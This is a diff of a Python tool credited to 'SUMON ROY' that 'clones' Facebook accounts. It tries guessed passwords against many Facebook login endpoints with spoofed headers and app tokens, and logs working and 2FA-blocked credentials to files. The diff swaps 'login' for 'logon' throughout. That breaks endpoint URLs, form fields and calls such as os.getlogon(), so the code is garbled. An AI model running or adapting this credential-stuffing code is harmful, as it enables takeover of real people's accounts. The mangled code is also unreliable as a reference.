@@ -335,7 +335,7 @@ logo =(f"""
    ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \033[1;34m ᴾᴿᴼ0
 \033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMON ROY
-\033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : a script designed to attempt logins
+\033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : a script designed to attempt logons
 \033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;36mFile × \033[1;36mRandom 
 \033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
@@ -420,7 +420,7 @@ def SUMON_time():
 class Process:
     def __init__(self):
         self.cc=[]
-        self.key="ATOM-"+ base64.b16encode(str(os.getuid()).encode()).decode() + hashlib.md5((''.join([platform.version(), str(os.getuid()), platform.platform(), os.getlogin(), platform.release()]).replace(' ', '').encode())).hexdigest()
+        self.key="ATOM-"+ base64.b16encode(str(os.getuid()).encode()).decode() + hashlib.md5((''.join([platform.version(), str(os.getuid()), platform.platform(), os.getlogon(), platform.release()]).replace(' ', '').encode())).hexdigest()
         self.key=""
         self.clear()
         r = self.Gex('https://pastebin.com/raw/uhce1AGG')
@@ -458,7 +458,7 @@ def menu():
     print("[1] FILE   CLONING =>")
     print("[2] RANDOM CLONING =>")
     print("[3] PUBLIK CLONING =>")
-    print("[4] CP RE-LOGIN    =>")
+    print("[4] CP RE-logoN    =>")
     print("[5] CONTACT (WHATSAPP) ")
     print("[6] EXIT TOOL ")
     linex()
@@ -936,7 +936,7 @@ def SUMONCP():
     cps = []
 
     os.system('clear')
-    LOGI()
+    logo()
 
     dfile = input(f'\x1b[38;5;86m[/] EXAMPLE \033[1;91m[sdcard/mahadi.txt]\n\x1b[38;5;87m[\] ENTER FILE PATH : ')
     try:
@@ -953,7 +953,7 @@ def SUMONCP():
 
     for user in dx:
         os.system('clear')
-        LOGI()
+        logo()
         print(f"{green}[{rad}+{green}] PROCESSING ONE ID...")
         linex()
 
@@ -968,7 +968,7 @@ def SUMONCP():
 
         print(f"{green}[{rad}+{green}] PROCESS COMPLETE.")
         linex()
-        input("PRESS ENTER TO LOGIN NEXT ID...")
+        input("PRESS ENTER TO logoN NEXT ID...")
 
 def ____PO_CO____():
     version_choices = ['14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1']
@@ -1003,7 +1003,7 @@ def freefb(uid, name, pwx, tl):
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'login_source': 'comet_headerless_login',
+            'logon_source': 'comet_headerless_logon',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
@@ -1028,8 +1028,8 @@ def freefb(uid, name, pwx, tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzUwMTgwMjQyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
+            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/logon/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzUwMTgwMjQyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             log_cookies = Session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
@@ -1045,7 +1045,7 @@ def freefb(uid, name, pwx, tl):
                     oks.append(uid)
                     break
             elif "checkpoint" in log_cookies:
-                if "Enter login code to continue" in log_cookies:
+                if "Enter logon code to continue" in log_cookies:
                     print(f" {cyan}[SUMON-2F] {uid}|{pw}")
                     open("/sdcard/SUMON_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                     twf.append(uid+"|"+pw)
@@ -1090,7 +1090,7 @@ def bapi(uid, name, pwx, tl):
                 'try_num': '1',
                 'family_Device_id': str(uuid.uuid4()),
                 'credentials_type': 'password',
-                'source': 'login',
+                'source': 'logon',
                 'error_detail_type': 'button_with_disabled',
                 'enroll_misauth': 'false',
                 'generate_Session_cookies': '1',
@@ -1099,7 +1099,7 @@ def bapi(uid, name, pwx, tl):
                 'locale': 'en_GB',
                 'client_country_code': 'GB',
                 'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'fb_api_caller_class': 'com.facebook.account.logon.protocol.Fb4aAuthHandler',
                 'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
             }
@@ -1123,7 +1123,7 @@ def bapi(uid, name, pwx, tl):
                 'X-FB-Server-Cluster': 'True',
                 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
             }
-            url = "https://b-api.facebook.com/auth/login"
+            url = "https://b-api.facebook.com/auth/logon"
             result = requests.post(url, data=data, headers=headers).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
@@ -1173,7 +1173,7 @@ def graph(uid, name, pwx, tl):
             'locale': 'en_US',
             'client_country_code': 'US',
             'cpl': 'true',
-            'source': 'login',
+            'source': 'logon',
             'format': 'json',
             'omit_response_on_success': 'false',
             'credentials_type': 'password',
@@ -1184,7 +1184,7 @@ def graph(uid, name, pwx, tl):
             'tier': 'regular',
             'currently_logged_in_userid': '0',
             'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'fb_api_caller_class': 'com.facebook.account.logon.protocol.Fb4aAuthHandler',
             'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
             'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
             'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
@@ -1207,7 +1207,7 @@ def graph(uid, name, pwx, tl):
             'X-FB-Friendly-Name': 'authenticate',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': '1026'}
-            url = "https://graph.facebook.com/auth/login"
+            url = "https://graph.facebook.com/auth/logon"
             result = requests.post(url, data=data, headers=headers).json()
             if "Session_key" in result:
                 coki = ";".join(i["name"]+"="+i["value"] for i in result["Session_cookies"])
@@ -1258,7 +1258,7 @@ def mbasic(uid,pwx,tl):
             'display': '',
             'isprivate': '',
             'return_session': '',
-            'skip_api_login': '',
+            'skip_api_logon': '',
             'signed_next': '',
             'trynum': '1',
             'timezone': '-330',
@@ -1293,7 +1293,7 @@ def mbasic(uid,pwx,tl):
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://hi-in.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
+            'referer': 'https://hi-in.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=120&lwc=1348092',
             'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -1303,8 +1303,8 @@ def mbasic(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://hi-in.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1361,7 +1361,7 @@ def p(uid,pwx,tl):
             'locale': 'en_US',
             'client_country_code': 'US',
             'cpl': 'true',
-            'source': 'login',
+            'source': 'logon',
             'format': 'json',
             'omit_response_on_success': 'false',
             'credentials_type': 'password',
@@ -1372,7 +1372,7 @@ def p(uid,pwx,tl):
             'tier': 'regular',
             'currently_logged_in_userid': '0',
             'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+            'fb_api_caller_class': 'com.facebook.account.logon.protocol.Fb4aAuthHandler',
             'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
             'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
             'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
@@ -1395,7 +1395,7 @@ def p(uid,pwx,tl):
             'X-FB-Friendly-Name': 'authenticate',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Content-Length': '1026'}
-            url = "https://graph.facebook.com/auth/login"
+            url = "https://graph.facebook.com/auth/logon"
             result = requests.post(url, data=data, headers=headers).text
             print(result)
             if "session_key" in result:
@@ -1462,7 +1462,7 @@ def x(uid,pwx,tl):
             'wd': '393x895',
             'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
             params = {
-            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
+            'appid': 'com.bloks.www.bloks.caa.logon.async.send_logon_request',
             'type': 'action',
             '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
             data = {
@@ -1486,14 +1486,14 @@ def x(uid,pwx,tl):
                 "credential_type": "password",
                 "username_text_input_id": "7w9omu:68",
                 "password_text_input_id": "7w9omu:69",
-                "login_source": "Login",
-                "login_credential_type": "none",
-                "server_login_source": "login",
-                "ar_event_source": "login_home_page",
-                "should_trigger_override_login_success_action": 0,
-                "should_trigger_override_login_2fa_action": 0,
+                "logon_source": "logon",
+                "logon_credential_type": "none",
+                "server_logon_source": "logon",
+                "ar_event_source": "logon_home_page",
+                "should_trigger_override_logon_success_action": 0,
+                "should_trigger_override_logon_2fa_action": 0,
                 "is_caa_perf_enabled": 0,
-                "reg_flow_source": "login_home_native_integration_point",
+                "reg_flow_source": "logon_home_native_integration_point",
                 "caller": "gslr",
                 "is_from_landing_page": 0,
                 "is_from_empty_password": 0,
@@ -1501,7 +1501,7 @@ def x(uid,pwx,tl):
                 "is_from_password_entry_page": 0,
                 "is_from_assistive_id": 0,
                 "is_from_msplit_fallback": 0,
-                "two_step_login_type": "one_step_login",
+                "two_step_logon_type": "one_step_logon",
                 "INTERNAL__latency_qpl_marker_id": 36707139,
                 "INTERNAL__latency_qpl_instance_id": "47746277400427",
                 "device_id": None,
@@ -1509,7 +1509,7 @@ def x(uid,pwx,tl):
                 "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
                 "offline_experiment_group": None,
                 "layered_homepage_experiment_group": None,
-                "is_platform_login": 0,
+                "is_platform_logon": 0,
                 "is_from_logged_in_switcher": 0,
                 "is_from_logged_out": 0,
                 "access_flow_version": "pre_mt_behavior"
@@ -1525,8 +1525,8 @@ def x(uid,pwx,tl):
                 "encrypted_msisdn": "",
                 "headers_infra_flow_id": "",
                 "try_num": 1,
-                "login_attempt_count": 1,
-                "event_flow": "login_manual",
+                "logon_attempt_count": 1,
+                "event_flow": "logon_manual",
                 "event_step": "home_page",
                 "openid_tokens": {},
                 "block_store_machine_id": "",
@@ -1550,7 +1550,7 @@ def x(uid,pwx,tl):
             headers = {
             'Host': 'm.facebook.com',
             'method': 'POST',
-            'path': '/login/Device-based/login/async/',
+            'path': '/logon/Device-based/logon/async/',
             'scheme': 'https',
             'content-length': '294',
             'Accept-Encoding': 'gzip',
@@ -1569,7 +1569,7 @@ def x(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'dnt': '1',
             'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'referer': 'https://m.facebook.com/logon.php?skip_api_logon=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fblogonKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fblogonReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogon%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fblogonKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fblogonReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
             'x-requested-with': 'mark.via.gp',
             'sec-fetch-site': 'none',
             'sec-fetch-mode': 'navigate',
@@ -1577,7 +1577,7 @@ def x(uid,pwx,tl):
             'sec-fetch-dest': 'document',
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
@@ -1666,11 +1666,11 @@ def mobile(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
             'sec-fetch-dest': 'empty',
-            'referer': 'https://hi-in.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'referer': 'https://hi-in.facebook.com/logon/?next&ref=dbl&fl&logon_from_aymh=1&refid=8',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
+            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = "https://hi-in.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1774,8 +1774,8 @@ def freeq(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
             'viewport-width': '885',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'
+            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=110'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1842,7 +1842,7 @@ def d(uid,pwx,tl):
             'wd': '393x895',
             'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
             params = {
-            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
+            'appid': 'com.bloks.www.bloks.caa.logon.async.send_logon_request',
             'type': 'action',
             '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
             data = {
@@ -1866,14 +1866,14 @@ def d(uid,pwx,tl):
                 "credential_type": "password",
                 "username_text_input_id": "7w9omu:68",
                 "password_text_input_id": "7w9omu:69",
-                "login_source": "Login",
-                "login_credential_type": "none",
-                "server_login_source": "login",
-                "ar_event_source": "login_home_page",
-                "should_trigger_override_login_success_action": 0,
-                "should_trigger_override_login_2fa_action": 0,
+                "logon_source": "logon",
+                "logon_credential_type": "none",
+                "server_logon_source": "logon",
+                "ar_event_source": "logon_home_page",
+                "should_trigger_override_logon_success_action": 0,
+                "should_trigger_override_logon_2fa_action": 0,
                 "is_caa_perf_enabled": 0,
-                "reg_flow_source": "login_home_native_integration_point",
+                "reg_flow_source": "logon_home_native_integration_point",
                 "caller": "gslr",
                 "is_from_landing_page": 0,
                 "is_from_empty_password": 0,
@@ -1881,7 +1881,7 @@ def d(uid,pwx,tl):
                 "is_from_password_entry_page": 0,
                 "is_from_assistive_id": 0,
                 "is_from_msplit_fallback": 0,
-                "two_step_login_type": "one_step_login",
+                "two_step_logon_type": "one_step_logon",
                 "INTERNAL__latency_qpl_marker_id": 36707139,
                 "INTERNAL__latency_qpl_instance_id": "47746277400427",
                 "device_id": None,
@@ -1889,7 +1889,7 @@ def d(uid,pwx,tl):
                 "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
                 "offline_experiment_group": None,
                 "layered_homepage_experiment_group": None,
-                "is_platform_login": 0,
+                "is_platform_logon": 0,
                 "is_from_logged_in_switcher": 0,
                 "is_from_logged_out": 0,
                 "access_flow_version": "pre_mt_behavior"
@@ -1905,8 +1905,8 @@ def d(uid,pwx,tl):
                 "encrypted_msisdn": "",
                 "headers_infra_flow_id": "",
                 "try_num": 1,
-                "login_attempt_count": 1,
-                "event_flow": "login_manual",
+                "logon_attempt_count": 1,
+                "event_flow": "logon_manual",
                 "event_step": "home_page",
                 "openid_tokens": {},
                 "block_store_machine_id": "",
@@ -1947,10 +1947,10 @@ def d(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
             'sec-fetch-dest': 'empty',
-            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'referer': 'https://mtouch.facebook.com/logon/?next&ref=dbl&fl&logon_from_aymh=1&refid=8',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://p.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
@@ -2031,7 +2031,7 @@ def cracker(uid, pwx, tl):
             'wd': '393x895',
             'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
             params = {
-            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
+            'appid': 'com.bloks.www.bloks.caa.logon.async.send_logon_request',
             'type': 'action',
             '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
             data = {
@@ -2055,14 +2055,14 @@ def cracker(uid, pwx, tl):
                 "credential_type": "password",
                 "username_text_input_id": "7w9omu:68",
                 "password_text_input_id": "7w9omu:69",
-                "login_source": "Login",
-                "login_credential_type": "none",
-                "server_login_source": "login",
-                "ar_event_source": "login_home_page",
-                "should_trigger_override_login_success_action": 0,
-                "should_trigger_override_login_2fa_action": 0,
+                "logon_source": "logon",
+                "logon_credential_type": "none",
+                "server_logon_source": "logon",
+                "ar_event_source": "logon_home_page",
+                "should_trigger_override_logon_success_action": 0,
+                "should_trigger_override_logon_2fa_action": 0,
                 "is_caa_perf_enabled": 0,
-                "reg_flow_source": "login_home_native_integration_point",
+                "reg_flow_source": "logon_home_native_integration_point",
                 "caller": "gslr",
                 "is_from_landing_page": 0,
                 "is_from_empty_password": 0,
@@ -2070,7 +2070,7 @@ def cracker(uid, pwx, tl):
                 "is_from_password_entry_page": 0,
                 "is_from_assistive_id": 0,
                 "is_from_msplit_fallback": 0,
-                "two_step_login_type": "one_step_login",
+                "two_step_logon_type": "one_step_logon",
                 "INTERNAL__latency_qpl_marker_id": 36707139,
                 "INTERNAL__latency_qpl_instance_id": "47746277400427",
                 "device_id": None,
@@ -2078,7 +2078,7 @@ def cracker(uid, pwx, tl):
                 "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
                 "offline_experiment_group": None,
                 "layered_homepage_experiment_group": None,
-                "is_platform_login": 0,
+                "is_platform_logon": 0,
                 "is_from_logged_in_switcher": 0,
                 "is_from_logged_out": 0,
                 "access_flow_version": "pre_mt_behavior"
@@ -2094,8 +2094,8 @@ def cracker(uid, pwx, tl):
                 "encrypted_msisdn": "",
                 "headers_infra_flow_id": "",
                 "try_num": 1,
-                "login_attempt_count": 1,
-                "event_flow": "login_manual",
+                "logon_attempt_count": 1,
+                "event_flow": "logon_manual",
                 "event_step": "home_page",
                 "openid_tokens": {},
                 "block_store_machine_id": "",
@@ -2136,10 +2136,10 @@ def cracker(uid, pwx, tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
             'sec-fetch-dest': 'empty',
-            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'referer': 'https://mbasic.facebook.com/logon/?next&ref=dbl&fl&logon_from_aymh=1&refid=8',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://mbasic.facebook.com/async/wbloks/fetch/"
             po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
             response = Session.cookies.get_dict().keys()
@@ -2238,8 +2238,8 @@ def __Fire__(ids,pas):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
             'viewport-width': '885',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'
+            twf = "logon approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=110'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
